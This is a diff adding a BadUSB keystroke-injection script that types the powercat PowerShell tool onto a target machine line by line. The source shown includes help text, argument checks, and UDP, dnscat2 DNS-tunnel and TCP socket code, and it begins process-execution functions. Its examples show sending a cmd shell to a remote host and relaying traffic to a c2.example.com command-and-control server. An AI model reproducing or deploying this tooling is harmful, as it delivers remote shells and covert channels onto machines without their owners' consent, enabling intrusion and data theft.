@@ -1,0 +1,984 @@
+DEFAULTCHARDELAY 12
+
+SWCOLOR_13 255 51 0
+STRINGLN function powercat
+STRINGLN {
+STRINGLN   param(
+STRINGLN     [alias("Client")][string]$c="",
+STRINGLN     [alias("Listen")][switch]$l=$False,
+STRINGLN     [alias("Port")][Parameter(Position=-1)][string]$p="",
+STRINGLN     [alias("Execute")][string]$e="",
+STRINGLN     [alias("ExecutePowershell")][switch]$ep=$False,
+STRINGLN     [alias("Relay")][string]$r="",
+STRINGLN     [alias("UDP")][switch]$u=$False,
+STRINGLN     [alias("dnscat2")][string]$dns="",
+STRINGLN     [alias("DNSFailureThreshold")][int32]$dnsft=10,
+STRINGLN     [alias("Timeout")][int32]$t=60,
+STRINGLN     [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
+STRINGLN     [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
+STRINGLN     [alias("OutputFile")][string]$of="",
+STRINGLN     [alias("Disconnect")][switch]$d=$False,
+STRINGLN     [alias("Repeater")][switch]$rep=$False,
+STRINGLN     [alias("GeneratePayload")][switch]$g=$False,
+STRINGLN     [alias("GenerateEncoded")][switch]$ge=$False,
+STRINGLN     [alias("Help")][switch]$h=$False
+STRINGLN   )
+STRINGLN   
+STRINGLN   ############### HELP ###############
+STRINGLN   $Help = "
+STRINGLN powercat - Netcat, The Powershell Version
+STRINGLN Github Repository: https://github.com/besimorhino/powercat
+STRINGLN 
+STRINGLN This script attempts to implement the features of netcat in a powershell
+STRINGLN script. It also contains extra features such as built-in relays, execute
+STRINGLN powershell, and a dnscat2 client.
+STRINGLN 
+STRINGLN Usage: powercat [-c or -l] [-p port] [options]
+STRINGLN 
+STRINGLN   -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
+STRINGLN                   If you are using -dns, specify the DNS Server to send queries to.
+STRINGLN             
+STRINGLN   -l              Listen Mode. Start a listener on the port specified by -p.
+STRINGLN   
+STRINGLN   -p  <port>      Port. The port to connect to, or the port to listen on.
+STRINGLN   
+STRINGLN   -e  <proc>      Execute. Specify the name of the process to start.
+STRINGLN   
+STRINGLN   -ep             Execute Powershell. Start a pseudo powershell session. You can
+STRINGLN                   declare variables and execute commands, but if you try to enter
+STRINGLN                   another shell (nslookup, netsh, cmd, etc.) the shell will hang.
+STRINGLN             
+STRINGLN   -r  <str>       Relay. Used for relaying network traffic between two nodes.
+STRINGLN                   Client Relay Format:   -r <protocol>:<ip addr>:<port>
+STRINGLN                   Listener Relay Format: -r <protocol>:<port>
+STRINGLN                   DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
+STRINGLN             
+STRINGLN   -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
+STRINGLN                   must send data before the server can respond.
+STRINGLN             
+STRINGLN   -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
+STRINGLN                   Specify the dns server to -c, the dns port to -p, and specify the 
+STRINGLN                   domain to this option, -dns. This is only a client.
+STRINGLN                   Get the server here: https://github.com/iagox86/dnscat2
+STRINGLN             
+STRINGLN   -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
+STRINGLN                   recieve before exiting. Set to zero when receiving files, and set high
+STRINGLN                   for more stability over the internet.
+STRINGLN             
+STRINGLN   -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
+STRINGLN                   connecting. Default: 60
+STRINGLN             
+STRINGLN   -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
+STRINGLN                   established. Used for moving files. You can provide the path to a file,
+STRINGLN                   a byte array object, or a string. You can also pipe any of those into
+STRINGLN                   powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
+STRINGLN             
+STRINGLN   -o  <type>      Output. Specify how powercat should return information to the console.
+STRINGLN                   Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
+STRINGLN             
+STRINGLN   -of <path>      Output File.  Specify the path to a file to write output to.
+STRINGLN             
+STRINGLN   -d              Disconnect. powercat will disconnect after the connection is established
+STRINGLN                   and the input from -i is sent. Used for scanning.
+STRINGLN             
+STRINGLN   -rep            Repeater. powercat will continually restart after it is disconnected.
+STRINGLN                   Used for setting up a persistent server.
+STRINGLN                   
+STRINGLN   -g              Generate Payload.  Returns a script as a string which will execute the
+STRINGLN                   powercat with the options you have specified. -i, -d, and -rep will not
+STRINGLN                   be incorporated.
+STRINGLN                   
+STRINGLN   -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
+STRINGLN                   can be executed in this way: powershell -E <encoded string>
+STRINGLN 
+STRINGLN   -h              Print this help message.
+STRINGLN 
+STRINGLN Examples:
+STRINGLN 
+STRINGLN   Listen on port 8000 and print the output to the console.
+STRINGLN       powercat -l -p 8000
+STRINGLN   
+STRINGLN   Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
+SWCOLOR_13 255 102 0
+STRINGLN       powercat -c 10.1.1.1 -p 443 -e cmd -v
+STRINGLN   
+STRINGLN   Connect to the dnscat2 server on c2.example.com, and send dns queries
+STRINGLN   to the dns server on 10.1.1.1 port 53.
+STRINGLN       powercat -c 10.1.1.1 -p 53 -dns c2.example.com
+STRINGLN   
+STRINGLN   Send a file to 10.1.1.15 port 8000.
+STRINGLN       powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
+STRINGLN   
+STRINGLN   Write the data sent to the local listener on port 4444 to C:\outfile
+STRINGLN       powercat -l -p 4444 -of C:\outfile
+STRINGLN   
+STRINGLN   Listen on port 8000 and repeatedly server a powershell shell.
+STRINGLN       powercat -l -p 8000 -ep -rep
+STRINGLN   
+STRINGLN   Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
+STRINGLN       powercat -l -p 8000 -r tcp:10.1.1.1:9000
+STRINGLN       
+STRINGLN   Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
+STRINGLN   sending queries to 10.1.1.1 port 53.
+STRINGLN       powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
+STRINGLN "
+STRINGLN   if($h){return $Help}
+STRINGLN   ############### HELP ###############
+STRINGLN   
+STRINGLN   ############### VALIDATE ARGS ###############
+STRINGLN   $global:Verbose = $Verbose
+STRINGLN   if($of -ne ''){$o = 'Bytes'}
+STRINGLN   if($dns -eq "")
+STRINGLN   {
+STRINGLN     if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
+STRINGLN     if($p -eq ""){return "Please provide a port number to -p."}
+STRINGLN   }
+STRINGLN   if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
+STRINGLN   if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
+STRINGLN   if($l)
+STRINGLN   {
+STRINGLN     $Failure = $False
+STRINGLN     netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
+STRINGLN     if($Failure){break}
+STRINGLN   }
+STRINGLN   if($r -ne "")
+STRINGLN   {
+STRINGLN     if($r.split(":").Count -eq 2)
+STRINGLN     {
+STRINGLN       $Failure = $False
+STRINGLN       netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){Write-Output ("The selected port " + $r.split(":")[1] + " is already in use.") ; $Failure=$True}}
+STRINGLN       if($Failure){break}
+STRINGLN     }
+STRINGLN   }
+STRINGLN   ############### VALIDATE ARGS ###############
+STRINGLN   
+STRINGLN   ############### UDP FUNCTIONS ###############
+STRINGLN   function Setup_UDP
+STRINGLN   {
+STRINGLN     param($FuncSetupVars)
+STRINGLN     if($global:Verbose){$Verbose = $True}
+STRINGLN     $c,$l,$p,$t = $FuncSetupVars
+STRINGLN     $FuncVars = @{}
+STRINGLN     $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+STRINGLN     if($l)
+STRINGLN     {
+STRINGLN       $SocketDestinationBuffer = New-Object System.Byte[] 65536
+STRINGLN       $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
+STRINGLN       $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
+STRINGLN       $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
+STRINGLN       Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
+STRINGLN       $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
+STRINGLN       $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+STRINGLN       while($True)
+STRINGLN       {
+STRINGLN         if($Host.UI.RawUI.KeyAvailable)
+STRINGLN         {
+STRINGLN           if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
+STRINGLN           {
+STRINGLN             Write-Verbose "CTRL or ESC caught. Stopping UDP Setup..."
+STRINGLN             $FuncVars["Socket"].Close()
+STRINGLN             $Stopwatch.Stop()
+STRINGLN             break
+STRINGLN           }
+STRINGLN         }
+STRINGLN         if($Stopwatch.Elapsed.TotalSeconds -gt $t)
+STRINGLN         {
+STRINGLN           $FuncVars["Socket"].Close()
+STRINGLN           $Stopwatch.Stop()
+STRINGLN           Write-Verbose "Timeout!" ; break
+STRINGLN         }
+STRINGLN         if($ConnectHandle.IsCompleted)
+STRINGLN         {
+STRINGLN           $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
+STRINGLN           Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
+STRINGLN           if($SocketBytesRead -gt 0){break}
+STRINGLN           else{break}
+STRINGLN         }
+STRINGLN       }
+STRINGLN       $Stopwatch.Stop()
+STRINGLN       $FuncVars["InitialConnectionBytes"] = $SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]
+STRINGLN     }
+STRINGLN     else
+SWCOLOR_13 255 153 0
+STRINGLN     {
+STRINGLN       if(!$c.Contains("."))
+STRINGLN       {
+STRINGLN         $IPList = @()
+STRINGLN         [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
+STRINGLN         Write-Verbose ("Name " + $c + " resolved to address " + $IPList[0])
+STRINGLN         $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
+STRINGLN       }
+STRINGLN       else
+STRINGLN       {
+STRINGLN         $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
+STRINGLN       }
+STRINGLN       $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient
+STRINGLN       $FuncVars["Socket"].Connect($c,$p)
+STRINGLN       Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p + "...")
+STRINGLN       Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
+STRINGLN     }
+STRINGLN     $FuncVars["BufferSize"] = 65536
+STRINGLN     $FuncVars["EndPoint"] = $EndPoint
+STRINGLN     $FuncVars["StreamDestinationBuffer"] = New-Object System.Byte[] $FuncVars["BufferSize"]
+STRINGLN     $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function ReadData_UDP
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     $Data = $null
+STRINGLN     if($FuncVars["StreamReadOperation"].IsCompleted)
+STRINGLN     {
+STRINGLN       $StreamBytesRead = $FuncVars["Socket"].Client.EndReceiveFrom($FuncVars["StreamReadOperation"],[ref]$FuncVars["EndPoint"])
+STRINGLN       if($StreamBytesRead -eq 0){break}
+STRINGLN       $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
+STRINGLN       $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
+STRINGLN     }
+STRINGLN     return $Data,$FuncVars
+STRINGLN   }
+STRINGLN   function WriteData_UDP
+STRINGLN   {
+STRINGLN     param($Data,$FuncVars)
+STRINGLN     $FuncVars["Socket"].Client.SendTo($Data,$FuncVars["EndPoint"]) | Out-Null
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function Close_UDP
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     $FuncVars["Socket"].Close()
+STRINGLN   }
+STRINGLN   ############### UDP FUNCTIONS ###############
+STRINGLN   
+STRINGLN   ############### DNS FUNCTIONS ###############
+STRINGLN   function Setup_DNS
+STRINGLN   {
+STRINGLN     param($FuncSetupVars)
+STRINGLN     if($global:Verbose){$Verbose = $True}
+STRINGLN     function ConvertTo-HexArray
+STRINGLN     {
+STRINGLN       param($String)
+STRINGLN       $Hex = @()
+STRINGLN       $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
+STRINGLN       return $Hex
+STRINGLN     }
+STRINGLN     
+STRINGLN     function SendPacket
+STRINGLN     {
+STRINGLN       param($Packet,$DNSServer,$DNSPort)
+STRINGLN       $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
+STRINGLN       $result = ($Command | nslookup 2>&1 | Out-String)
+STRINGLN       if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
+STRINGLN       else{return 1}
+STRINGLN     }
+STRINGLN     
+STRINGLN     function Create_SYN
+STRINGLN     {
+STRINGLN       param($SessionId,$SeqNum,$Tag,$Domain)
+STRINGLN       return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + "0000" + $Domain)
+STRINGLN     }
+STRINGLN     
+STRINGLN     function Create_FIN
+STRINGLN     {
+STRINGLN       param($SessionId,$Tag,$Domain)
+STRINGLN       return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
+STRINGLN     }
+STRINGLN     
+STRINGLN     function Create_MSG
+STRINGLN     {
+STRINGLN       param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
+STRINGLN       return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
+STRINGLN     }
+STRINGLN     
+STRINGLN     function DecodePacket
+STRINGLN     {
+STRINGLN       param($Packet)
+STRINGLN       
+STRINGLN       if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
+STRINGLN       $AcknowledgementNumber = ($Packet[10..13] -join "")
+STRINGLN       $SeqNum = ($Packet[14..17] -join "")
+STRINGLN       [byte[]]$ReturningData = @()
+STRINGLN       
+STRINGLN       if($Packet.Length -gt 18)
+SWCOLOR_13 255 204 0
+STRINGLN       {
+STRINGLN         $PacketElim = $Packet.Substring(18)
+STRINGLN         while($PacketElim.Length -gt 0)
+STRINGLN         {
+STRINGLN           $ReturningData += [byte[]][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
+STRINGLN           $PacketElim = $PacketElim.Substring(2)
+STRINGLN         }
+STRINGLN       }
+STRINGLN       
+STRINGLN       return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
+STRINGLN     }
+STRINGLN     
+STRINGLN     function AcknowledgeData
+STRINGLN     {
+STRINGLN       param($ReturningData,$AcknowledgementNumber)
+STRINGLN       $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
+STRINGLN       if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
+STRINGLN       return $Hex
+STRINGLN     }
+STRINGLN     $FuncVars = @{}
+STRINGLN     $FuncVars["DNSServer"],$FuncVars["DNSPort"],$FuncVars["Domain"],$FuncVars["FailureThreshold"] = $FuncSetupVars
+STRINGLN     if($FuncVars["DNSPort"] -eq ''){$FuncVars["DNSPort"] = "53"}
+STRINGLN     $FuncVars["Tag"] = ""
+STRINGLN     $FuncVars["Domain"] = ("." + $FuncVars["Domain"])
+STRINGLN     
+STRINGLN     $FuncVars["Create_SYN"] = ${function:Create_SYN}
+STRINGLN     $FuncVars["Create_MSG"] = ${function:Create_MSG}
+STRINGLN     $FuncVars["Create_FIN"] = ${function:Create_FIN}
+STRINGLN     $FuncVars["DecodePacket"] = ${function:DecodePacket}
+STRINGLN     $FuncVars["ConvertTo-HexArray"] = ${function:ConvertTo-HexArray}
+STRINGLN     $FuncVars["AckData"] = ${function:AcknowledgeData}
+STRINGLN     $FuncVars["SendPacket"] = ${function:SendPacket}
+STRINGLN     $FuncVars["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
+STRINGLN     $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
+STRINGLN     $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+STRINGLN     $FuncVars["Failures"] = 0
+STRINGLN     
+STRINGLN     $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
+STRINGLN     $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
+STRINGLN     $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
+STRINGLN     if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
+STRINGLN     $ReturningData = $DecodedPacket[1]
+STRINGLN     if($ReturningData -ne ""){$FuncVars["InputData"] = ""}
+STRINGLN     $FuncVars["AckNum"] = $DecodedPacket[2]
+STRINGLN     $FuncVars["MaxMSGDataSize"] = (244 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
+STRINGLN     if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function ReadData_DNS
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     if($global:Verbose){$Verbose = $True}
+STRINGLN     
+STRINGLN     $PacketsData = @()
+STRINGLN     $PacketData = ""
+STRINGLN     
+STRINGLN     if($FuncVars["InputData"] -ne $null)
+STRINGLN     {
+STRINGLN       $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
+STRINGLN       $SectionCount = 0
+STRINGLN       $PacketCount = 0
+STRINGLN       foreach($Char in $Hex)
+STRINGLN       {
+STRINGLN         if($SectionCount -ge 30)
+STRINGLN         {
+STRINGLN           $SectionCount = 0
+STRINGLN           $PacketData += "."
+STRINGLN         }
+STRINGLN         if($PacketCount -ge ($FuncVars["MaxMSGDataSize"]))
+STRINGLN         {
+STRINGLN           $PacketsData += $PacketData.TrimEnd(".")
+STRINGLN           $PacketCount = 0
+STRINGLN           $SectionCount = 0
+STRINGLN           $PacketData = ""
+STRINGLN         }
+STRINGLN         $PacketData += $Char
+STRINGLN         $SectionCount += 2
+STRINGLN         $PacketCount += 2
+STRINGLN       }
+STRINGLN       $PacketData = $PacketData.TrimEnd(".")
+STRINGLN       $PacketsData += $PacketData
+STRINGLN       $FuncVars["InputData"] = ""
+STRINGLN     }
+STRINGLN     else
+STRINGLN     {
+STRINGLN       $PacketsData = @("")
+STRINGLN     }
+STRINGLN     
+STRINGLN     [byte[]]$ReturningData = @()
+STRINGLN     foreach($PacketData in $PacketsData)
+STRINGLN     {
+STRINGLN       try{$MSGPacket = Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],$PacketData,$FuncVars["Tag"],$FuncVars["Domain"])}
+STRINGLN       catch{ Write-Verbose "DNSCAT2: Failed to create packet." ; $FuncVars["Failures"] += 1 ; continue }
+STRINGLN       try{$Packet = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($MSGPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))}
+STRINGLN       catch{ Write-Verbose "DNSCAT2: Failed to send packet." ; $FuncVars["Failures"] += 1 ; continue }
+STRINGLN       try
+STRINGLN       {
+STRINGLN         $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($Packet))
+STRINGLN         if($DecodedPacket.Length -ne 4){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..."; $FuncVars["Failures"] += 1 ; continue }
+STRINGLN         $FuncVars["AckNum"] = $DecodedPacket[2]
+SWCOLOR_14 255 255 0
+STRINGLN         $FuncVars["SeqNum"] = $DecodedPacket[3]
+STRINGLN         $ReturningData += $DecodedPacket[1]
+STRINGLN       }
+STRINGLN       catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
+STRINGLN       if($DecodedPacket -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
+STRINGLN     }
+STRINGLN     
+STRINGLN     if($FuncVars["Failures"] -ge $FuncVars["FailureThreshold"]){break}
+STRINGLN     
+STRINGLN     if($ReturningData -ne @())
+STRINGLN     {
+STRINGLN       $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
+STRINGLN     }
+STRINGLN     return $ReturningData,$FuncVars
+STRINGLN   }
+STRINGLN   function WriteData_DNS
+STRINGLN   {
+STRINGLN     param($Data,$FuncVars)
+STRINGLN     $FuncVars["InputData"] = $FuncVars["Encoding"].GetString($Data)
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function Close_DNS
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
+STRINGLN     Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
+STRINGLN   }
+STRINGLN   ############### DNS FUNCTIONS ###############
+STRINGLN   
+STRINGLN   ########## TCP FUNCTIONS ##########
+STRINGLN   function Setup_TCP
+STRINGLN   {
+STRINGLN     param($FuncSetupVars)
+STRINGLN     $c,$l,$p,$t = $FuncSetupVars
+STRINGLN     if($global:Verbose){$Verbose = $True}
+STRINGLN     $FuncVars = @{}
+STRINGLN     if(!$l)
+STRINGLN     {
+STRINGLN       $FuncVars["l"] = $False
+STRINGLN       $Socket = New-Object System.Net.Sockets.TcpClient
+STRINGLN       Write-Verbose "Connecting..."
+STRINGLN       $Handle = $Socket.BeginConnect($c,$p,$null,$null)
+STRINGLN     }
+STRINGLN     else
+STRINGLN     {
+STRINGLN       $FuncVars["l"] = $True
+STRINGLN       Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
+STRINGLN       $Socket = New-Object System.Net.Sockets.TcpListener $p
+STRINGLN       $Socket.Start()
+STRINGLN       $Handle = $Socket.BeginAcceptTcpClient($null, $null)
+STRINGLN     }
+STRINGLN     
+STRINGLN     $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+STRINGLN     while($True)
+STRINGLN     {
+STRINGLN       if($Host.UI.RawUI.KeyAvailable)
+STRINGLN       {
+STRINGLN         if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
+STRINGLN         {
+STRINGLN           Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
+STRINGLN           if($FuncVars["l"]){$Socket.Stop()}
+STRINGLN           else{$Socket.Close()}
+STRINGLN           $Stopwatch.Stop()
+STRINGLN           break
+STRINGLN         }
+STRINGLN       }
+STRINGLN       if($Stopwatch.Elapsed.TotalSeconds -gt $t)
+STRINGLN       {
+STRINGLN         if(!$l){$Socket.Close()}
+STRINGLN         else{$Socket.Stop()}
+STRINGLN         $Stopwatch.Stop()
+STRINGLN         Write-Verbose "Timeout!" ; break
+STRINGLN         break
+STRINGLN       }
+STRINGLN       if($Handle.IsCompleted)
+STRINGLN       {
+STRINGLN         if(!$l)
+STRINGLN         {
+STRINGLN           try
+STRINGLN           {
+STRINGLN             $Socket.EndConnect($Handle)
+STRINGLN             $Stream = $Socket.GetStream()
+STRINGLN             $BufferSize = $Socket.ReceiveBufferSize
+STRINGLN             Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
+STRINGLN           }
+STRINGLN           catch{$Socket.Close(); $Stopwatch.Stop(); break}
+STRINGLN         }
+STRINGLN         else
+STRINGLN         {
+STRINGLN           $Client = $Socket.EndAcceptTcpClient($Handle)
+STRINGLN           $Stream = $Client.GetStream()
+STRINGLN           $BufferSize = $Client.ReceiveBufferSize
+STRINGLN           Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
+STRINGLN         }
+STRINGLN         break
+STRINGLN       }
+STRINGLN     }
+STRINGLN     $Stopwatch.Stop()
+SWCOLOR_14 204 255 0
+STRINGLN     if($Socket -eq $null){break}
+STRINGLN     $FuncVars["Stream"] = $Stream
+STRINGLN     $FuncVars["Socket"] = $Socket
+STRINGLN     $FuncVars["BufferSize"] = $BufferSize
+STRINGLN     $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
+STRINGLN     $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
+STRINGLN     $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+STRINGLN     $FuncVars["StreamBytesRead"] = 1
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function ReadData_TCP
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     $Data = $null
+STRINGLN     if($FuncVars["StreamBytesRead"] -eq 0){break}
+STRINGLN     if($FuncVars["StreamReadOperation"].IsCompleted)
+STRINGLN     {
+STRINGLN       $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
+STRINGLN       if($StreamBytesRead -eq 0){break}
+STRINGLN       $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
+STRINGLN       $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
+STRINGLN     }
+STRINGLN     return $Data,$FuncVars
+STRINGLN   }
+STRINGLN   function WriteData_TCP
+STRINGLN   {
+STRINGLN     param($Data,$FuncVars)
+STRINGLN     $FuncVars["Stream"].Write($Data, 0, $Data.Length)
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function Close_TCP
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     try{$FuncVars["Stream"].Close()}
+STRINGLN     catch{}
+STRINGLN     if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
+STRINGLN     else{$FuncVars["Socket"].Close()}
+STRINGLN   }
+STRINGLN   ########## TCP FUNCTIONS ##########
+STRINGLN   
+STRINGLN   ########## CMD FUNCTIONS ##########
+STRINGLN   function Setup_CMD
+STRINGLN   {
+STRINGLN     param($FuncSetupVars)
+STRINGLN     if($global:Verbose){$Verbose = $True}
+STRINGLN     $FuncVars = @{}
+STRINGLN     $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+STRINGLN     $ProcessStartInfo.FileName = $FuncSetupVars[0]
+STRINGLN     $ProcessStartInfo.UseShellExecute = $False
+STRINGLN     $ProcessStartInfo.RedirectStandardInput = $True
+STRINGLN     $ProcessStartInfo.RedirectStandardOutput = $True
+STRINGLN     $ProcessStartInfo.RedirectStandardError = $True
+STRINGLN     $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
+STRINGLN     Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
+STRINGLN     $FuncVars["Process"].Start() | Out-Null
+STRINGLN     $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
+STRINGLN     $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
+STRINGLN     $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
+STRINGLN     $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
+STRINGLN     $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+STRINGLN     return $FuncVars
+STRINGLN   }
